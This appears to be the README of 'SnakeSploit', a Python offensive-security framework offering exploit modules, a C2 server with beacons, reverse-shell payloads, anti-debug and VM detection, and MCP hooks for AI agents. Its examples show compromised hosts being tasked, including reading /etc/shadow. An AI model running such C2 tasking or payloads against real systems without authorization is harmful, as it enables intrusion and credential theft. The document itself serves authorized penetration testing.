<p align="center">
  <img src="https://img.shields.io/badge/Python-3.11%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.11+">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License MIT">
  <img src="https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge" alt="PRs Welcome">
</p>

<p align="center">
  <b>Python-Powered Exploit Framework</b> — <i>Auto-Updating CVE/PoC Modules</i>
</p>

---

## 🔥 Overview

**SnakeSploit** is a modular penetration testing framework built in pure Python. It **auto-generates exploit modules from live CVEs**, includes a **full C2 framework** (Mythic-compatible + built-in), **payload/stager generation**, **anti-tamper protection**, and **MCP integration for AI agents** — all with zero external dependencies.

| Feature | SnakeSploit | Traditional |
|---------|------------|-------------|
| Module updates | Auto-generated from live CVEs every 6h | Wait for framework releases |
| CVE coverage | 200+ modules, updated daily | Static module database |
| C2 Framework | Built-in + Mythic API | Separate tool (CS, Mythic) |
| Anti-Tamper | File integrity + anti-debug + process protection | None |
| AI Agent Support | MCP protocol (Claude, Cline, Cursor) | None |
| Dependencies | Python stdlib only | Gigabytes of tools |

---

## ✨ Features

| | Feature | Description |
|:-:|---------|-------------|
| 🎯 | **Interactive Console** | Metasploit-like workflow: `search` → `use` → `set` → `check` → `run` |
| 🔄 | **Auto-Update Pipeline** | Fetches CVEs from NVD every 6h, scrapes GitHub for PoCs, generates modules |
| 📦 | **200+ Auto-Generated Modules** | Live exploit/auxiliary stubs from real CVEs — updated daily |
| 🧠 | **C2 Framework** | Built-in C2 server (listeners, agents, tasking, staging) + Mythic REST API |
| 💀 | **Payload Stagers** | Python/PowerShell/Bash beacons that automatically check in to your C2 |
| 🛡️ | **Anti-Tamper System** | SHA-256 integrity verification, anti-debug, process protection, file monitoring |
| 🤖 | **MCP Protocol** | AI agents discover and use SnakeSploit tools via Model Context Protocol |
| 🔍 | **CVE Cache Engine** | NVD API 2.0 with severity filtering (Critical/High/Medium) |
| 🕸️ | **PoC Scraper** | Searches GitHub and Exploit-DB for proof-of-concept code |
| 🤖 | **Strix AI Scanner** | AI-powered web security scanning with configurable API key |
| 💀 | **Payload Generator** | 7 payload types: reverse shells (Python/Bash/NC/PowerShell/Perl/PHP) + bind shells |
| 📡 | **Port Scanner** | Fast TCP port scanning with service fingerprinting + banner grabbing |
| 🎯 | **Target Management** | Persistent database — hosts, services, banners, vulnerabilities |
| 🐚 | **Session Handling** | Listener mode, interactive shell sessions, multi-session management |
| 🔐 | **License Control** | LicenseSeat integration — activate, revoke, deactivate, auto-kick on revocation |
| 🖥️ | **Web Dashboard** | Premium GUI with real-time stats, target management, live console, reports |
| 📋 | **Engagement Reports** | Generate HTML reports with targets, services, vulnerabilities, CVEs |

---

## 🚀 Quick Install

```bash
git clone <repo-url>
cd SnakeSploit
python3 install.py
snakesploit
```

> **No dependencies required** — SnakeSploit uses only Python standard library.
> Optional: `nmap` for advanced scanning, `flask` for web dashboard.

---

## 🧠 C2 Framework (No Mythic Required)

SnakeSploit includes a **full Command & Control framework** that works completely standalone. No Mythic, no Cobalt Strike, no external servers needed.

### Built-in C2 Server

```bash
# Create and start a listener
snakesploit > c2 listener create beacon 0.0.0.0 4444
snakesploit > c2 listener start beacon

# Stage a payload (beacon)
snakesploit > c2 payload python LHOST=10.0.0.5 LPORT=4444 name=stage1

# Deploy the stager on target → agent checks in automatically
snakesploit > c2 list
  agent_1  192.168.1.100  admin@PC-01  windows  active
  agent_2  10.0.0.50      root@server  linux    active

# Task agents
snakesploit > c2 task agent_1 "whoami"
snakesploit > c2 task agent_2 "cat /etc/shadow"
```

### Stager Types

| Type | Platform | Size | Features |
|------|----------|------|----------|
| `python` | Multi | ~2KB | Full tasking, command output, threaded |
| `powershell` | Windows | ~1KB | Native PS, task execution |
| `bash` | Linux | ~300B | Lightweight, /dev/tcp based |

### Mythic Integration (Optional)

```bash
snakesploit > c2 mythic connect https://mythic-server:7443 API_KEY
snakesploit > c2 mythic callbacks
snakesploit > c2 mythic task 1 "shell whoami"
```

---

## 🛡️ Anti-Tamper System

SnakeSploit includes a **multi-layer anti-tamper system** to detect code modification and debugging:

| Protection | What it does |
|-----------|-------------|
| **SHA-256 Integrity** | All core files are hashed. Any modification is detected on launch |
| **Anti-Debug** | Detects ptrace (debugger) attachment via TracerPid |
| **Process Hardening** | Makes process non-dumpable via `prctl(PR_SET_DUMPABLE, 0)` |
| **File Monitor** | Background thread re-checks hashes every 30 seconds |
| **Tamper Flag** | Tampering evidence persists across sessions |
| **VM Detection** | Detects VMware, VirtualBox, QEMU, Docker environments |

```bash
# Manual verification
snakesploit --verify

# Auto-checked on every launch
snakesploit
```

---

## 🔐 License System

SnakeSploit uses **[LicenseSeat](https://licenseseat.com)** for secure license management.

```bash
# Activate your key
snakesploit --activate YOUR-LICENSE-KEY

# Deactivate (frees seat on shared machines)
snakesploit --deactivate

# From console
snakesploit > deactivate
snakesploit > logout
```

**Revocation:** When revoked in the LicenseSeat dashboard → auto-kicked within 3 minutes.

---

## 🤖 MCP Protocol (AI Agent Integration)

SnakeSploit implements the **Model Context Protocol**, allowing AI agents to discover and use its tools:

```bash
# Start MCP server
snakesploit --mcp http --mcp-port 8765

# Connect Claude Code:
claude --mcp http://127.0.0.1:8765

# Claude can now: "scan 192.168.1.100 for open ports"
```

---

## 🎮 Usage

### Interactive Console

```bash
snakesploit
```

```
snakesploit > scan 192.168.1.100
snakesploit > search smb
snakesploit > use smb_version_scanner
snakesploit (smb_version_scanner) > set RHOSTS 192.168.1.100
snakesploit (smb_version_scanner) > set RPORT 445
snakesploit (smb_version_scanner) > check
snakesploit (smb_version_scanner) > run
```

### Web Dashboard

```bash
pip install flask
snakesploit --gui
# Open: http://localhost:5000
# Or GitHub Pages: https://hermesna-1.github.io/SnakeSploit/
```

---

## 📋 Command Reference

### Core
| Command | Description |
|---------|-------------|
| `help` | Show command reference |
| `exit` / `quit` | Exit |
| `shell <cmd>` | Run system command |
| `clear` | Clear screen |

### C2 Framework
| Command | Description |
|---------|-------------|
| `c2 status` | C2 server status |
| `c2 list` | List active agents |
| `c2 task <id> <cmd>` | Task an agent |
| `c2 listener create <name> <host> <port>` | Create listener |
| `c2 listener start <name>` | Start listener |
| `c2 payload <type> LHOST=x LPORT=y name=n` | Stage a payload |
| `c2 mythic connect <url> <key>` | Connect to Mythic |
| `c2 pivot <agent_id> <port>` | Create pivot listener |

### Update
| Command | Description |
|---------|-------------|
| `update [days]` | Pull code + fetch CVEs |
| `update full [days]` | Full pipeline |
| `update-self` | Just pull code |
| `cve stats` | CVE cache statistics |
| `pocs <CVE-ID>` | Search PoCs |

### Modules
| Command | Description |
|---------|-------------|
| `search <query>` | Find modules |
| `use <name>` | Load module |
| `set <opt> <val>` | Set option |
| `show [options\|info]` | Show module info |
| `check` | Vulnerability probe |
| `run` / `exploit` | Execute |
| `back` | Unload module |
| `list [category]` | List modules |
| `reload modules` | Reload from disk |

### Scanning & Targets
| Command | Description |
|---------|-------------|
| `scan <host> [ports]` | TCP port scan |
| `http <url>` | HTTP GET request |
| `targets` | List all targets |
| `targets add <host>` | Add target |
| `targets show <host>` | View target details |

### Payloads & Sessions
| Command | Description |
|---------|-------------|
| `payloads` | List payload types |
| `payloads <type> LHOST=x LPORT=y` | Generate payload |
| `listener <port>` | Start listener |
| `sessions [-i id]` | List/interact sessions |

### Advanced
| Command | Description |
|---------|-------------|
| `strix <target>` | Strix AI scan |
| `mcp [http]` | Start MCP server |
| `gui [port]` | Start web dashboard |
| `deactivate` / `logout` | Free license seat |
| `--verify` | Check code integrity |

---

## 🏗️ Architecture

```
SnakeSploit/
├── snakesploit.py          # Entry point + CLI
├── console.py              # Interactive console
├── web_gui.py              # Flask web dashboard
├── mcp_server.py           # MCP protocol server
├── install.py              # Installer
├── uninstall.py            # Uninstaller
│
├── core/
│   ├── antitamper.py       # Anti-debug, integrity, file monitoring
│   ├── c2.py               # C2 framework (Mythic + built-in)
│   ├── integrity.py        # SHA-256 manifest verification
│   ├── license.py          # LicenseSeat client
│   ├── strix.py            # Strix AI scanner
│   ├── module.py           # Module system
│   ├── target.py           # Target database
│   └── session.py          # Session management
│
├── modules/                # Exploit modules
├── data/modules_generated/ # 200+ auto-generated CVE modules
├── updater/                # CVE auto-update engine
├── lib/                    # Network, payloads
└── docs/                   # GitHub Pages site
```

---

## 🛡️ Disclaimer

SnakeSploit is a **penetration testing framework** for **authorized security assessments only**.

- Only use against systems you own or have explicit written permission to test
- Auto-generated modules are **stubs** — they probe services but don't execute exploits
- Unauthorized access is illegal
- The author assumes no liability for misuse

---

## 📝 License

MIT License — see [LICENSE](LICENSE).

---

<p align="center">
  <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen?style=for-the-badge" alt="Open Source">
</p>